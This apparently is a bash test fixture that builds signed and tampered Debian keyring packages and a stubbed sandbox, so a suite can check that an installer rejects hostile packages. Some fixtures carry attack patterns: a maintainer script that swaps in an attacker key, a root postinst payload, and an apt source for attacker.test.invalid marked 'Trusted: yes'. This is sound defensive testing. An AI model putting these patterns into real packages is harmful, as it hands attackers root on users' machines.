#!/usr/bin/env bash
# Shared fixture for the installer suites: key material, fixture packages and the
# sandbox the installer runs in. Sourced by tests/installer/*.test.sh, which sit
# two levels below the repository root.
# shellcheck disable=SC2034 # the fingerprints and counters are read by the suites
set -u

HERE="$(cd "$(dirname "$0")/../.." && pwd)"
TEMPLATE="$HERE/scripts/installer/install-template.sh"
WORK="$(mktemp -d)"
trap 'gpgconf --kill all 2>/dev/null || true; rm -rf "$WORK"' EXIT
pass=0; fail=0

check() { # <description> <expected> <actual>
	if [ "$2" = "$3" ]; then
		echo "ok    $1"; pass=$((pass + 1))
	else
		echo "FAIL  $1"; echo "        expected: $2"; echo "        actual:   $3"
		fail=$((fail + 1))
	fi
}

for tool in gpg dpkg-deb curl; do
	command -v "$tool" >/dev/null 2>&1 || {
		echo "NOTE  $tool is not installed here, so nothing below could run."
		echo "      This is not a pass. Install $tool and run again."
		exit 1
	}
done
curl --version | grep -q '\bfile\b' || {
	echo "NOTE  this curl has no file:// protocol, so the fixtures cannot be served."
	echo "      This is not a pass."
	exit 1
}

# --- key material -----------------------------------------------------------

mkkey() { # $1=uid -> prints the 40-char fingerprint
	local home="$WORK/gnupg-$1"
	mkdir -p "$home"; chmod 700 "$home"
	GNUPGHOME="$home" gpg --batch --quiet --passphrase '' \
		--quick-generate-key "$1 <$1@test.invalid>" default default never \
		>/dev/null 2>&1
	GNUPGHOME="$home" gpg --batch --with-colons --list-keys "$1" \
		| awk -F: '/^fpr:/{print $10; exit}'
}
export_ring() { # $1=uid $2=output file  (binary keyring, as the package ships)
	GNUPGHOME="$WORK/gnupg-$1" gpg --batch --export "$1" > "$2"
}

FPR_GOOD="$(mkkey good)"
# The incoming key of a rotation: legitimate, and published alongside the old
# one during the overlap.
FPR_NEW="$(mkkey new)"
# Needed for the keyring it creates, not for the value.
mkkey evil >/dev/null

# --- fixture packages -------------------------------------------------------

# $1=name  $2=uids whose keys go into the shipped keyring  $3=postinst? (yes|no)
mkdeb() {
	local name="$1" uids="$2" postinst="$3"
	local root="$WORK/pkg-$name"
	rm -rf "$root"
	mkdir -p "$root/DEBIAN" "$root/usr/share/keyrings"
	printf 'Package: glyndor-archive-keyring\nVersion: 1.0\nArchitecture: all\nMaintainer: t <t@test.invalid>\nDescription: fixture\n' \
		> "$root/DEBIAN/control"
	: > "$root/usr/share/keyrings/glyndor.gpg"
	local u
	for u in $uids; do
		export_ring "$u" "$WORK/ring-$u.gpg"
		cat "$WORK/ring-$u.gpg" >> "$root/usr/share/keyrings/glyndor.gpg"
	done
	if [ "$postinst" = yes ]; then
		# What a hostile keyring package would do: rewrite the installed keyring
		# from its maintainer script, so that a check reading the INSTALLED file
		# would find the expected fingerprint. `dpkg-deb -x` never runs this.
		cat > "$root/DEBIAN/postinst" <<POST
#!/bin/sh
cat "$WORK/ring-good.gpg" "$WORK/ring-evil.gpg" > /usr/share/keyrings/glyndor.gpg
POST
		chmod 755 "$root/DEBIAN/postinst"
	fi
	dpkg-deb --root-owner-group --build "$root" "$WORK/$name.deb" >/dev/null 2>&1
	# Every fixture is signed by a key its own keyring carries, so a refusal
	# below is the one the case is about. Defaulting to the first of $2 is what
	# keeps that true without every call site having to say it: the evil-keyring
	# fixture is signed by evil, the rotation fixture by good, and both are then
	# correct in every respect except the one under test.
	sign_deb "${4:-${uids%% *}}" "$WORK/$name.deb"
	echo "$WORK/$name.deb"
}

# $1=uid whose key signs  $2=package to sign, written to <package>.asc
sign_deb() {
	# --yes matters more than it looks. Without it gpg refuses to overwrite an
	# existing .asc, --batch turns that refusal into a silent non-zero, and the
	# PREVIOUS signature stays on disk next to a package that was just rebuilt
	# with new timestamps. Measured: six cases went green against a stale
	# signature, including the one asserting that a signature by an outside key
	# is refused, which was passing because no outside key had signed anything.
	GNUPGHOME="$WORK/gnupg-$1" gpg --batch --yes --quiet --pinentry-mode loopback \
		--passphrase '' --local-user "$1" --armor --detach-sign \
		--output "$2.asc" "$2" >/dev/null 2>&1
}

# A package that keeps a signature made over DIFFERENT bytes.
#
# This is what the fingerprint check cannot see, and it needs no stolen key.
# The attacker takes the published package, which carries the genuine archive
# key, adds a payload, and serves the published signature next to it. The key
# inside is the real one, so every check that reads only the key passes.
#
# Both payloads reach root. `postinst` is executed by `dpkg -i`. `sources` needs
# no maintainer script at all: `Trusted: yes` switches off verification for
# everything apt then fetches from that source.
#
# $1=name  $2=postinst|sources
mktampered() {
	local name="$1" payload="$2"
	local root="$WORK/pkg-$name"
	rm -rf "$root"
	mkdir -p "$root/DEBIAN" "$root/usr/share/keyrings"
	printf 'Package: glyndor-archive-keyring\nVersion: 1.0\nArchitecture: all\nMaintainer: t <t@test.invalid>\nDescription: fixture\n' \
		> "$root/DEBIAN/control"
	export_ring good "$root/usr/share/keyrings/glyndor.gpg"

	# The legitimate pair first: this is what the archive publishes, and the
	# signature the attacker keeps.
	dpkg-deb --root-owner-group --build "$root" "$WORK/$name.deb" >/dev/null 2>&1
	sign_deb good "$WORK/$name.deb"

	# Now the payload, and rebuild over the same path. Same keyring, same genuine
	# key, different bytes, and the signature from a moment ago left in place.
	case "$payload" in
		postinst)
			printf '#!/bin/sh\ntouch /tmp/pwned\n' > "$root/DEBIAN/postinst"
			chmod 755 "$root/DEBIAN/postinst"
			;;
		sources)
			mkdir -p "$root/etc/apt/sources.list.d"
			printf 'Types: deb\nURIs: http://attacker.test.invalid\nSuites: stable\nComponents: main\nTrusted: yes\n' \
				> "$root/etc/apt/sources.list.d/glyndor.sources"
			;;
	esac
	dpkg-deb --root-owner-group --build "$root" "$WORK/$name.deb" >/dev/null 2>&1
	echo "$WORK/$name.deb"
}

# --- the sandbox the installer runs in --------------------------------------

# The stub directory goes FIRST on PATH and shadows the three commands that
# must not do their real work. Whitelisting the rest instead of shadowing was
# the first attempt and it was wrong: `dpkg-deb -x` shells out to `tar`, which
# was not on the list, so every case failed extraction -- including the one that
# should have been accepted, and the hostile one, which then "passed" for the
# wrong reason. The assertion that names WHICH refusal fired is what caught it.
BIN="$WORK/bin"
mkdir -p "$BIN"
# uid 0 without being root: the root check runs first and is not what is tested.
printf '#!/bin/sh\necho 0\n' > "$BIN/id"; chmod +x "$BIN/id"
# apt-get must exist and succeed; nothing here installs a package.
printf '#!/bin/sh\nexit 0\n' > "$BIN/apt-get"; chmod +x "$BIN/apt-get"
# dpkg records that it was reached instead of installing. Its absence is the
# assertion that the installer refused before `dpkg -i`.
cat > "$BIN/dpkg" <<'STUB'
#!/bin/sh
case "$1" in
	-i) echo "$*" >> "$DPKG_MARKER" ;;
esac
exit 0
STUB
chmod +x "$BIN/dpkg"
# The installer runs `@PRODUCT@ --version` after `apt-get install` and refuses
# when that exits non-zero, so every case below needs a stub on PATH that
# starts. The version string matches what run_tty prints later, so a case that
# overrides it can be told apart by the stub it overwrites with.
printf '#!/bin/sh\necho "testpkg version v9.9.9"\n' > "$BIN/testpkg"
chmod +x "$BIN/testpkg"

# $1=deb path  $2=expected fingerprint  -> exit code, output in $WORK/out,
# marker in $WORK/marker
run_installer() {
	rm -f "$WORK/marker"
	sed 's/@PRODUCT@/testpkg/g' "$TEMPLATE" > "$WORK/install.sh"
	env -i PATH="${INSTALLER_PATH:-$BIN:$PATH}" HOME="$WORK" WORK="$WORK" \
		DPKG_MARKER="$WORK/marker" \
		KEYRING_URL="file://$1" \
		GLYNDOR_APT_FPR="$2" \
		/bin/sh "$WORK/install.sh" >"$WORK/out" 2>&1
}
said() { grep -qF "$1" "$WORK/out" && echo 1 || echo 0; }
installed() { [ -f "$WORK/marker" ] && echo 1 || echo 0; }

